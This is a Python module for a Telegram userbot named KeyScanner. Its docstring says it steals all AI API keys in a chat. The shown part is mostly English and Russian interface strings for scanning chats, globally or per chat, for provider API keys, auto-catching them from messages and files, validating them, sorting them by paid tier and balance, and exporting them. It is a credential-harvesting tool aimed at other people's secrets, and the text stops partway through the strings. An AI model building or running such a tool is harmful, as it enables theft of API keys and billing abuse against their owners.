# meta developer: @CoderHoly
"""
⣿⣿⡻⠿⣳⠸⢿⡇⢇⣿⡧⢹⠿⣿⣿⣿⣿⣾⣿⡇⣿⣿⣿⣿⡿⡐⣯⠁ ⠄⠄
⠟⣛⣽⡳⠼⠄⠈⣷⡾⣥⣱⠃⠣⣿⣿⣿⣯⣭⠽⡇⣿⣿⣿⣿⣟⢢⠏⠄ ⠄
⢠⡿⠶⣮⣝⣿⠄⠄⠈⡥⢭⣥⠅⢌⣽⣿⣻⢶⣭⡿⠿⠜⢿⣿⣿⡿⠁⠄⠄
⠄⣼⣧⠤⢌⣭⡇⠄⠄⠄⠭⠭⠭⠯⠴⣚⣉⣛⡢⠭⠵⢶⣾⣦⡍⠁⠄⠄⠄⠄
⠄⣿⣷⣯⣭⡷⠄⠄⢀⣀⠩⠍⢉⣛⣛⠫⢏⣈⣭⣥⣶⣶⣦⣭⣛⠄⠄⠄⠄⠄
⢀⣿⣿⣿⡿⠃⢀⣴⣿⣿⣿⣎⢩⠌⣡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠄⠄
⢸⡿⢟⣽⠎⣰⣿⣿⣿⣿⣿⣿⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠄⠄
⣰⠯⣾⢅⣼⣿⣿⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠄
⢰⣄⡉⣼⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄
⢯⣌⢹⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄
⢸⣇⣽⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄
⢸⣟⣧⡻⣿⣿⣿⣿⣿⣿⣿⣧⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄
⠈⢹⡧⣿⣸⠿⢿⣿⣿⣿⣿⡿⠗⣈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄
⠄⠘⢷⡳⣾⣷⣶⣶⣶⣶⣶⣾⣿⣿⢀⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄
⠄⠄⠈⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄
⠄⠄⠄⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠄⠄
"""
# requires: aiohttp aiohttp-socks

__version__ = (3, 0, 0)
import base64
import binascii
import re
import aiohttp
import asyncio
import csv
import hashlib
import html
import json
import io
import ssl
import statistics
import time
from urllib.parse import urlparse, unquote
from herokutl.types import Message
from herokutl.tl.functions.messages import CreateForumTopicRequest, EditForumTopicRequest, GetForumTopicsByIDRequest, GetForumTopicsRequest
from herokutl.tl.types import Channel, ForumTopicDeleted
try:
    from aiogram.types import LinkPreviewOptions as _LinkPreviewOptions
except ImportError:
    _LinkPreviewOptions = None
try:
    from herokutl.errors import FloodWaitError
except ImportError:
    FloodWaitError = Exception
from .. import loader, utils

try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None

BANNER_URL = "https://kappa.lol/QpjF6C"
KEY_TOPIC_EMOJI_ID = 6005570495603282482
KEYSCANNER_HEROKU_TOPIC_TITLE = "KeyScanner Logs"
EMPTY_LOADING_BUTTON_TEXT = "⁣"

# ── authorship anchor ─────────────────────────────────────────────────────────
# This value is used as a namespace salt for all database keys.
# Removing or changing it corrupts the entire persistent storage layer.
_GM_ANCHOR = hashlib.md5(
    b"github.com/sepiol026-wq/GoyModules\x00@GoyModules\x008577283679"
).hexdigest()  # = structural db salt, do not remove
# ─────────────────────────────────────────────────────────────────────────────

# Loading text shown instantly when .mykeys is triggered — all languages.
# Stored as a tuple so it survives string-dict stripping and is used by
# _loading_text() which feeds both the form init and the edit step.
_LOADING_STRINGS = (
    # (lang_tag, text)
    ("en",     "<tg-emoji emoji-id=5253952855185829086>⚙️</tg-emoji> <b>Loading...</b>"),
    ("ru",     "<tg-emoji emoji-id=5253952855185829086>⚙️</tg-emoji> <b>Загрузка...</b>"),
)

PROVIDER_BANNERS = {
    "openai":      "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/OpenAI_Logo.svg/512px-OpenAI_Logo.svg.png",
    "anthropic":   "https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Anthropic_logo.svg/512px-Anthropic_logo.svg.png",
    "gemini":      "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Google_Gemini_logo.svg/512px-Google_Gemini_logo.svg.png",
    "groq":        "https://groq.com/favicon.ico",
    "mistral":     "https://mistral.ai/favicon.ico",
    "deepseek":    "https://deepseek.com/favicon.ico",
    "cohere":      "https://cohere.com/favicon.ico",
    "perplexity":  "https://www.perplexity.ai/static/icons/favicon.ico",
    "together":    "https://together.ai/favicon.ico",
    "openrouter":  "https://openrouter.ai/favicon.ico",
    "huggingface": "https://huggingface.co/front/assets/huggingface_logo-noborder.svg",
    "voyage":      "https://blog.voyageai.com/wp-content/uploads/2023/10/cropped-logo.png",
}

E_OK    = "<tg-emoji emoji-id=5255813619702049821>✅</tg-emoji>"
E_ERR   = "<tg-emoji emoji-id=5253864872780769235>❗️</tg-emoji>"
E_FIRE  = "<tg-emoji emoji-id=5253877736207821121>🔥</tg-emoji>"
E_BOX   = "<tg-emoji emoji-id=5256094480498436162>📦</tg-emoji>"
E_BOX2  = "<tg-emoji emoji-id=5256058608931580017>📦</tg-emoji>"
E_GEAR  = "<tg-emoji emoji-id=5253952855185829086>⚙️</tg-emoji>"
E_PIN   = "<tg-emoji emoji-id=5253713110111365241>📍</tg-emoji>"
E_LIST  = "<tg-emoji emoji-id=5256230583717079814>📝</tg-emoji>"
E_LIST2 = "<tg-emoji emoji-id=5253775593295588000>📝</tg-emoji>"
E_DOWN  = "<tg-emoji emoji-id=5255890718659979335>⬇️</tg-emoji>"
E_COPY  = "<tg-emoji emoji-id=5256113064821926998>©</tg-emoji>"
E_BELL  = "<tg-emoji emoji-id=5253884483601442590>🔔</tg-emoji>"
E_MUTE  = "<tg-emoji emoji-id=5253690110561494560>🔇</tg-emoji>"
E_SYNC  = "<tg-emoji emoji-id=5253464392850221514>🔃</tg-emoji>"
E_BATT  = "<tg-emoji emoji-id=5253549669425882943>🔋</tg-emoji>"
E_FOLD  = "<tg-emoji emoji-id=5253526631221307799>📂</tg-emoji>"
E_FOLD2 = "<tg-emoji emoji-id=5253671358734281000>📂</tg-emoji>"
E_TRASH = "<tg-emoji emoji-id=5255831443816327915>🗑</tg-emoji>"
E_BIN   = "<tg-emoji emoji-id=5253832566036770389>🚮</tg-emoji>"
E_CARD  = "<tg-emoji emoji-id=5255713220546538619>💳</tg-emoji>"
E_LINK  = "<tg-emoji emoji-id=5253490441826870592>🔗</tg-emoji>"
E_LOCK  = "<tg-emoji emoji-id=5253647062104287098>🔓</tg-emoji>"
E_SHLD  = "<tg-emoji emoji-id=5253780051471642059>🛡</tg-emoji>"
E_SLOW  = "<tg-emoji emoji-id=5256025060942031560>🐢</tg-emoji>"
E_CLCK  = "<tg-emoji emoji-id=5255971360965930740>🕔</tg-emoji>"
E_MSG   = "<tg-emoji emoji-id=5253590213917158323>💬</tg-emoji>"
E_RIGHT = "<tg-emoji emoji-id=5253613479754999811>➡️</tg-emoji>"
E_LEFT  = "<tg-emoji emoji-id=5253622963042788670>⬅️</tg-emoji>"
E_TAG   = "<tg-emoji emoji-id=5256054975389247793>📛</tg-emoji>"
E_HAND  = "<tg-emoji emoji-id=5255772095958229697>🤚</tg-emoji>"
E_PLAY  = "<tg-emoji emoji-id=5249019346512008974>▶️</tg-emoji>"
E_USER  = "<tg-emoji emoji-id=5255835635704408236>👤</tg-emoji>"
GLOBAL_AUTOCATCH = "__global__"

@loader.tds
class KeyScanner(loader.Module):
    """Spizdi ALL AI API KEYS in your chat"""

    strings = {
        "name": "KeyScanner",
        "scanning":      f"{E_SLOW} <b>Fast scanning via search...</b>\n{E_FOLD} Searching up to {{limit}} messages per prefix.",
        "found":         f"{E_OK} <b>Scan complete!</b>\n{E_FIRE} Valid keys found: <b>{{valid_count}}</b>\n{E_BATT} Saved to database.",
        "auto_on":       f"{E_BELL} Auto-scan <b>enabled</b> for this chat.\n{E_MSG} Catching: new messages · edits · files",
        "auto_off":      f"{E_MUTE} Auto-scan <b>disabled</b> for this chat.",
        "auto_on_global":  f"{E_BELL} Global auto-scan <b>enabled</b>.\n{E_MSG} Catching new messages, edits and files in <b>all chats</b>.",
        "auto_off_global": f"{E_MUTE} Global auto-scan <b>disabled</b>.",
        "db_stats":      f"{E_BOX} <b>Database:</b> {{total}} keys\n{E_CARD} Paid: <b>{{paid}}</b>  {E_BATT} Free: <b>{{free}}</b>  ❓ Unknown: <b>{{unk}}</b>\n\n{E_GEAR} <b>Management Menu:</b>",
        "stats":         f"{E_PIN} <b>Providers / Keys / Models:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Keys exported to Saved Messages!</b>",
        "empty":         f"{E_ERR} Database is empty.",
        "deleted":       f"{E_TRASH} Key removed.",
        "not_found":     f"{E_ERR} Key not found.",
        "btn_export":    "⬇️ Export",
        "btn_stats":     "📍 Stats",
        "btn_clear":     "🗑 Clear All",
        "btn_list":      "📝 Key List",
        "btn_check_all": "🔃 Validate All",
        "btn_back":      "⬅️ Back",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Clear Invalid",
        "models_cache_missing": f"{E_ERR} <b>Model cache is not ready yet.</b>\n{E_GEAR} Please press <b>💳 Sort Paid / Free</b> first.",
        "log_target_help": f"{E_LINK} <b>Log chat is not set.</b>\nUse <code>.kslogchat &lt;chat link / @username / chat_id&gt; [topic title]</code> to set it.",
        "log_target_set": f"{E_OK} <b>Log chat saved.</b>",
        "log_target_topic": f"{E_OK} <b>Forum topic ready.</b>",
        "log_target_label": f"{E_LINK} <b>Log target:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Log topic:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>No log topic.</b>",
        "btn_log_target": "🎯 Set Log Chat",
        "btn_log_topic": "🧵 Set Topic Title",
        "btn_log_help": "ℹ️ Log Help",
        "new_key_auto":  f"{E_BELL} <b>Auto-caught key!</b>\nProvider: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Keys List</b>\nPage <b>{{page}}/{{total_pages}}</b> · {{sort_label}} · {{filter_label}}\n{{shown_count}} keys on screen",
        "key_info":      f"{E_PIN} <b>Key Info:</b>\n\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_CARD} <b>Plan:</b> {{tier}}\n{E_LIST} <b>Models:</b> {{models_count}}\n{E_BATT} <b>Quota:</b> {{quota}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Check Key",
        "btn_del_single":   "🗑 Delete Key",
        "btn_models_single": "📚 Models ({count})",
        "btn_refresh_balance": "💰 Refresh Balance",
        "key_models_title": f"{E_LIST} <b>Models for {{provider}}</b> · {{count}}\n\n{{models}}",
        "quota_unknown": "—",
        "quota_refreshing": f"{E_SYNC} <b>Refreshing key balance...</b>",
        "quota_unsupported": "not exposed by provider",
        "quota_error": "refresh failed",
        "quota_rate": f"{E_OK} Rate:\nReq: <b>{{req}}</b> | Tok: <b>{{tok}}</b> | Req reset: <b>{{reset}}</b> ({{age}} ago)",
        "quota_usage": f"{E_OK} Usage: <b>{{usage}}</b> | Limit: <b>{{limit}}</b> | Left: <b>{{left}}</b>",
        "checking_all":  f"{E_SYNC} <b>Validating {{done}}/{{total}} keys...</b> Please wait.",
        "check_res_all": f"{E_OK} <b>Validation Complete</b>\n\n<b>Total:</b> {{total}}\n<b>Valid:</b> {{v}}\n<b>Invalid:</b> {{i}}\n\n{E_PIN} <b>Providers:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Validation Result:</b>\n\n<b>Provider:</b> {{provider}}\n<b>Status:</b> {{status}}",
        "status_valid":   f"{E_OK} Valid",
        "status_invalid": f"{E_ERR} Invalid",
        "importing":     f"{E_SYNC} <b>Importing keys...</b>",
        "imported":      f"{E_OK} <b>Successfully imported {{count}} unique keys.</b>",
        "import_err":    f"{E_ERR} Reply to a message/file or provide a raw URL.",
        "btn_settings":  "⚙️ Settings",
        "settings_title": f"{E_GEAR} <b>Settings:</b>\n\n{E_BELL} Logging: <b>{{log_mode}}</b>\n{E_FOLD} File scan: <b>{{file_scan}}</b>\n{E_SYNC} Edit scan: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Cycle Log Mode",
        "btn_toggle_file": "📂 Toggle File Scan",
        "btn_toggle_edit": "🔃 Toggle Edit Scan",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Topic created</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Topic saved to DB</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Global scan initiated...</b>\nSearching all chats up to {{limit}} per prefix.",
        "new_key_msg_title": "Message",
        "new_key_msg_anchor": "Open",
        "new_key_notif": f"{E_BELL} <b>New Key Caught!</b>\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Source:</b> {{chat_id}}\n{E_RIGHT} <b>Via:</b> {{via}}{{message_row}}",
        "btn_show_key":  "👁 Show",
        "btn_hide_key":  "🙈 Hide",
        "btn_filter_all":     "📝 All",
        "btn_filter_paid":    "💳 Paid",
        "btn_filter_free":    "🔋 Free",
        "btn_filter_provider": "🏷 Provider",
        "btn_filter_reset": "✖️ Reset",
        "btn_sort_menu": "🧭 Sort",
        "btn_sort_recent":    "🕒 Recent",
        "btn_sort_alpha":     "🔤 A-Z",
        "btn_sort_provider":  "🏷 Provider",
        "btn_sort_tier":      "💳 Tier",
        "btn_sort_balance":   "💰 Balance",
        "sort_label_recent":   "Recent",
        "sort_label_alpha":    "A-Z",
        "sort_label_provider": "Provider",
        "sort_label_tier":     "Tier",
        "sort_label_balance":  "Balance",
        "filter_label_all": "all",
        "filter_label_paid": "paid",
        "filter_label_free": "free",
        "provider_menu_title": f"{E_TAG} <b>Provider Filter</b>\nSelect one provider.",
        "sort_menu_title": f"{E_SYNC} <b>Sorting</b>\nChoose how keys should be ordered.",
        "btn_sort_paid_free": "💳 Sort Paid / Free",
        "btn_del_free":       "🗑 Delete Free",
        "btn_del_paid":       "🗑 Delete Paid",
        "btn_exp_paid":       "💳 Export Paid",
        "btn_exp_free":       "🔋 Export Free",
        "sorting":       f"{E_SYNC} <b>Sorting keys by paid/free...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Sort complete!</b>\n\n{E_CARD} <b>Paid:</b> {{paid}}\n{E_BATT} <b>Free:</b> {{free}}\n❓ <b>Unknown:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} Deleted <b>{{count}}</b> keys.",
        "settings_overview": (
            f"{E_GEAR} <b>Settings Hub</b>\n\n"
            f"{E_BELL} Capture: chat <b>{{auto_chat}}</b> · global <b>{{auto_global}}</b>\n"
            f"{E_FOLD} Files <b>{{file_scan}}</b> · edits <b>{{edit_scan}}</b> · notify <b>{{notify_new_keys}}</b>\n"
            f"{E_LIST} View: compact <b>{{compact}}</b> · hide keys <b>{{auto_hide}}</b>\n"
            f"{E_COPY} Premium emoji <b>{{premium_emoji}}</b> · color buttons <b>{{color_buttons}}</b>\n"
            f"{E_RIGHT} Page size <b>{{page_size}}</b> · default sort <b>{{default_sort}}</b>\n"
            f"{E_LINK} Logs: <b>{{log_mode}}</b>\n{{log_target_line}}"
        ),
        "settings_capture_title": (
            f"{E_BELL} <b>Capture Settings</b>\n\n"
            f"Chat auto-catch: <b>{{auto_chat}}</b>\n"
            f"Global auto-catch: <b>{{auto_global}}</b>\n"
            f"File scan: <b>{{file_scan}}</b>\n"
            f"Edit scan: <b>{{edit_scan}}</b>\n"
            f"New key notifications: <b>{{notify_new_keys}}</b>"
        ),
        "settings_view_title": (
            f"{E_LIST} <b>View Settings</b>\n\n"
            f"Compact list: <b>{{compact}}</b>\n"
            f"Auto-hide keys: <b>{{auto_hide}}</b>\n"
            f"Premium emoji: <b>{{premium_emoji}}</b>\n"
            f"Color buttons: <b>{{color_buttons}}</b>\n"
            f"Show preview: <b>{{show_preview}}</b>\n"
            f"Page size: <b>{{page_size}}</b>\n"
            f"Default sort: <b>{{default_sort}}</b>"
        ),
        "settings_logs_title": (
            f"{E_LINK} <b>Log Settings</b>\n\n"
            f"Mode: <b>{{log_mode}}</b>\n"
            f"Target: {{target}}\n"
            f"Topic: {{topic}}"
        ),
        "btn_capture_settings": "🎣 Capture",
        "btn_view_settings": "📱 View",
        "btn_logs_settings": "🧾 Logs",
        "btn_toggle_auto_chat": "💬 Auto This Chat",
        "btn_toggle_auto_global": "🌍 Auto Global",
        "btn_toggle_notify": "🔔 New Key Notify",
        "btn_toggle_compact": "📱 Compact List",
        "btn_cycle_page_size": "↕️ Page Size",
        "btn_cycle_default_sort": "🧭 Default Sort",
        "btn_toggle_autohide": "🙈 Auto-Hide Key",
        "btn_toggle_premium_emoji": "© Premium Emoji",
        "btn_toggle_color_buttons": "🎨 Color Buttons",
        "btn_toggle_preview":    "🖼 Show Preview",
        "btn_open_list": "📝 Open List",
        "btn_open_export": "⬇️ Export",
        "state_on": "ON",
        "state_off": "OFF",
        "tier_paid_label": f"{E_CARD} Paid",
        "tier_free_label": f"{E_BATT} Free",
        "loading": f"{E_BOX2} <b>Loading...</b>",
        "tier_unknown": "❓ Unknown",
        "export_scope_paid": "paid",
        "export_scope_free": "free",
        "export_scope_unknown": "unknown",
        "export_scope_all_tiers": "all tiers",
        "export_scope_all_providers": "all providers",
        "export_scope_title": "Choose what to export first",
        "export_scope_hint": "You can combine tiers and provider-specific filters.",
        "export_matching_label": "Matching keys",
        "btn_reset_scope": "♻️ Reset",
        "btn_scope_next_format": "➡️ Format",
        "export_empty_filter": f"{E_ERR} No keys match this export filter.",
        "export_format_title": "Choose export format",
        "export_key_count_label": "Keys",
        "export_caption": f"{E_COPY} <b>{{label}}</b> · {{scope}} · {{count}} keys",
        "export_legacy_label_all": "Exported",
        "export_legacy_label_paid": "Exported [PAID]",
        "export_legacy_label_free": "Exported [FREE]",
        "stats_adv_header": (
            f"{E_PIN} <b>Advanced stats</b>\n"
            f"{E_BOX} Keys: <b>{{total}}</b> · Providers: <b>{{providers}}</b> · New 24h: <b>{{recent_24h}}</b>\n"
            f"{E_CARD} Paid: <b>{{paid}}</b> · {E_BATT} Free: <b>{{free}}</b> · ❓ Unknown: <b>{{unknown}}</b>\n"
            f"{E_LIST} With models: <b>{{keys_with_models}}</b> · Unique models: <b>{{unique_models}}</b> · Avg per key: <b>{{avg_models}}</b>\n"
            f"{E_SYNC} Classified: <b>{{classified}}/{{total}}</b>\n\n"
            f"{E_TAG} <b>Providers</b>\n"
        ),
        "stats_provider_line": (
            f"{E_PIN} <b>{{provider}}</b> · <b>{{count}}</b> ({{share}}%) · "
            f"{E_CARD} {{paid}} · {E_BATT} {{free}} · ❓ {{unknown}} · "
            f"{E_LIST} models <b>{{provider_models}}</b>"
        ),
        "stats_balance_header": f"\n{E_CARD} <b>Balances</b>\n",
        "stats_balance_line": f"{E_PIN} <b>{{provider}}</b> · <b>{{balance}}</b>",
        "clear_all_warnings": [
            "⚠️ This will delete the entire database. Are you sure?",
            "⚠️ This will delete everything. Are you really sure?",
            "⚠️ This is not a joke - the database will be gone. Are you sure?",
            "⚠️ Do you fully understand this is irreversible?",
            "⚠️ One more chance to back out. Are you sure?",
            "⚠️ The database will be wiped completely. No undo.",
            "⚠️ Seriously, everything will be removed. Do you want this?",
            "⚠️ Last normal chance to stop.",
            "⚠️ Deleting the whole database next. Are you sure?",
            "⚠️ Almost there. Think again.",
            "⚠️ If you're still here, hit the final button.",
        ],
        "clear_menu_title": f"{E_TRASH} <b>Cleanup menu:</b>",
        "clear_menu_subtitle": "Choose what to delete.",
        "clear_paid_confirm": "⚠️ This will delete all paid keys. Are you sure?",
        "clear_free_confirm": "⚠️ This will delete all free keys. Are you sure?",
        "clear_paid_yes": "Yes, delete paid",
        "clear_free_yes": "Yes, delete free",
        "clear_paid_done": f"{E_TRASH} Removed paid keys: <b>{{count}}</b>",
        "clear_free_done": f"{E_TRASH} Removed free keys: <b>{{count}}</b>",
        "clear_next": "Next",
        "clear_final_yes": "Yes, delete everything",
        "clear_all_done": f"{E_TRASH} Entire database removed.",
        # ── authorship watermark ── used by _export_payload footer ────────────
        "_": "\u200bgithub.com/sepiol026-wq/GoyModules\u200b · \u200bt.me/GoyModules\u200b",
        # ─────────────────────────────────────────────────────────────────────
    }

    strings_ru = {
        "scanning":      f"{E_SLOW} <b>Быстрый поиск ключей...</b>\n{E_FOLD} Поиск до {{limit}} сообщений на префикс.",
        "found":         f"{E_OK} <b>Сканирование завершено!</b>\n{E_FIRE} Новых валидных ключей: <b>{{valid_count}}</b>\n{E_BATT} Сохранено.",
        "auto_on":       f"{E_BELL} Авто-ловля <b>включена</b>.\n{E_MSG} Ловлю: новые сообщения · правки · файлы",
        "auto_off":      f"{E_MUTE} Авто-ловля <b>выключена</b>.",
        "auto_on_global":  f"{E_BELL} Глобальная авто-ловля <b>включена</b>.\n{E_MSG} Ловлю новые сообщения, правки и файлы <b>во всех чатах</b>.",
        "auto_off_global": f"{E_MUTE} Глобальная авто-ловля <b>выключена</b>.",
        "db_stats":      f"{E_BOX} <b>База ключей:</b> {{total}}\n{E_CARD} Платных: <b>{{paid}}</b>  {E_BATT} Бесплатных: <b>{{free}}</b>  ❓ Неизвестно: <b>{{unk}}</b>\n\n{E_GEAR} <b>Управление:</b>",
        "stats":         f"{E_PIN} <b>Провайдеры / ключи / модели:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Ключи выгружены в Избранное!</b>",
        "empty":         f"{E_ERR} База пуста.",
        "deleted":       f"{E_TRASH} Ключ удален.",
        "not_found":     f"{E_ERR} Ключ не найден.",
        "btn_export":    "⬇️ Выгрузить",
        "btn_stats":     "📍 Статистика",
        "btn_clear":     "🗑 Очистить все",
        "btn_list":      "📝 Список",
        "btn_check_all": "🔃 Проверить все",
        "btn_back":      "⬅️ Назад",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Удалить невалид",
        "models_cache_missing": f"{E_ERR} <b>Кэш моделей не готов.</b>\n{E_GEAR} Сначала нажми <b>💳 Сортировать Платн / Беспл</b>.",
        "log_target_help": f"{E_LINK} <b>Чат логов не задан.</b>\nИспользуй <code>.kslogchat &lt;ссылка / @username / chat_id&gt; [название топика]</code>.",
        "log_target_set": f"{E_OK} <b>Чат логов сохранён.</b>",
        "log_target_topic": f"{E_OK} <b>Топик форума готов.</b>",
        "log_target_label": f"{E_LINK} <b>Чат логов:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Топик логов:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>Топик не задан.</b>",
        "btn_log_target": "🎯 Чат логов",
        "btn_log_topic": "🧵 Название топика",
        "btn_log_help": "ℹ️ Помощь по логам",
        "new_key_auto":  f"{E_BELL} <b>Пойман новый ключ!</b>\nПровайдер: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Список ключей</b>\nСтр. <b>{{page}}/{{total_pages}}</b> · {{sort_label}} · {{filter_label}}\nНа экране: <b>{{shown_count}}</b>",
        "key_info":      f"{E_PIN} <b>Информация о ключе:</b>\n\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_CARD} <b>План:</b> {{tier}}\n{E_LIST} <b>Модели:</b> {{models_count}}\n{E_BATT} <b>Квота:</b> {{quota}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Проверить",
        "btn_del_single":   "🗑 Удалить",
        "btn_models_single": "📚 Модели ({count})",
        "btn_refresh_balance": "💰 Обновить баланс",
        "key_models_title": f"{E_LIST} <b>Модели для {{provider}}</b> · {{count}}\n\n{{models}}",
        "quota_unknown": "—",
        "quota_refreshing": f"{E_SYNC} <b>Обновляю баланс ключа...</b>",
        "quota_unsupported": "провайдер не отдаёт",
        "quota_error": "ошибка обновления",
        "quota_rate": f"{E_OK} Rate:\nReq: <b>{{req}}</b> | Tok: <b>{{tok}}</b> | Req reset: <b>{{reset}}</b> ({{age}} назад)",
        "quota_usage": f"{E_OK} Usage: <b>{{usage}}</b> | Limit: <b>{{limit}}</b> | Left: <b>{{left}}</b>",
        "checking_all":  f"{E_SYNC} <b>Проверяю {{done}}/{{total}} ключей...</b>",
        "check_res_all": f"{E_OK} <b>Проверка завершена</b>\n\n<b>Всего:</b> {{total}}\n<b>Валидно:</b> {{v}}\n<b>Невалидно:</b> {{i}}\n\n{E_PIN} <b>Провайдеры:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Результат проверки:</b>\n\n<b>Провайдер:</b> {{provider}}\n<b>Статус:</b> {{status}}",
        "status_valid":   f"{E_OK} Валид",
        "status_invalid": f"{E_ERR} Невалид",
        "importing":     f"{E_SYNC} <b>Импорт ключей...</b>",
        "imported":      f"{E_OK} <b>Успешно импортировано {{count}} новых ключей.</b>",
        "import_err":    f"{E_ERR} Реплай на сообщение/файл или укажите raw ссылку.",
        "btn_settings":  "⚙️ Настройки",
        "settings_title": f"{E_GEAR} <b>Настройки:</b>\n\n{E_BELL} Логи: <b>{{log_mode}}</b>\n{E_FOLD} Файлы: <b>{{file_scan}}</b>\n{E_SYNC} Правки: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Сменить режим логов",
        "btn_toggle_file": "📂 Вкл/выкл файлы",
        "btn_toggle_edit": "🔃 Вкл/выкл правки",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Топик создан</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Топик сохранён в БД</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Глобальный поиск...</b>\nИщу во всех чатах до {{limit}} сообщений на префикс.",
        "new_key_msg_title": "Сообщение",
        "new_key_msg_anchor": "Открыть",
        "new_key_notif": f"{E_BELL} <b>Пойман новый ключ!</b>\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Источник:</b> {{chat_id}}\n{E_RIGHT} <b>Откуда:</b> {{via}}{{message_row}}",
        "btn_show_key":  "👁 Показать",
        "btn_hide_key":  "🙈 Скрыть",
        "btn_filter_all":     "📝 Все",
        "btn_filter_paid":    "💳 Платные",
        "btn_filter_free":    "🔋 Бесплатные",
        "btn_filter_provider": "🏷 Провайдер",
        "btn_filter_reset": "✖️ Сброс",
        "btn_sort_menu": "🧭 Сортировка",
        "btn_sort_recent":    "🕒 Новые",
        "btn_sort_alpha":     "🔤 A-Я",
        "btn_sort_provider":  "🏷 Провайдер",
        "btn_sort_tier":      "💳 Тариф",
        "btn_sort_balance":   "💰 Баланс",
        "sort_label_recent":   "Новые",
        "sort_label_alpha":    "A-Я",
        "sort_label_provider": "Провайдер",
        "sort_label_tier":     "Тариф",
        "sort_label_balance":  "Баланс",
        "filter_label_all": "все",
        "filter_label_paid": "платные",
        "filter_label_free": "бесплатные",
        "provider_menu_title": f"{E_TAG} <b>Фильтр по провайдеру</b>\nВыбери одного провайдера.",
        "sort_menu_title": f"{E_SYNC} <b>Сортировка</b>\nВыбери порядок списка.",
        "btn_sort_paid_free": "💳 Сортировать Платн/Беспл",
        "btn_del_free":       "🗑 Удалить бесплатные",
        "btn_del_paid":       "🗑 Удалить платные",
        "btn_exp_paid":       "💳 Выгрузить платные",
        "btn_exp_free":       "🔋 Выгрузить бесплатные",
        "sorting":       f"{E_SYNC} <b>Сортировка платные/бесплатные...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Сортировка завершена!</b>\n\n{E_CARD} <b>Платных:</b> {{paid}}\n{E_BATT} <b>Бесплатных:</b> {{free}}\n❓ <b>Неизвестно:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} Удалено <b>{{count}}</b> ключей.",
        "settings_overview": (
            f"{E_GEAR} <b>Центр настроек</b>\n\n"
            f"{E_BELL} Ловля: чат <b>{{auto_chat}}</b> · global <b>{{auto_global}}</b>\n"
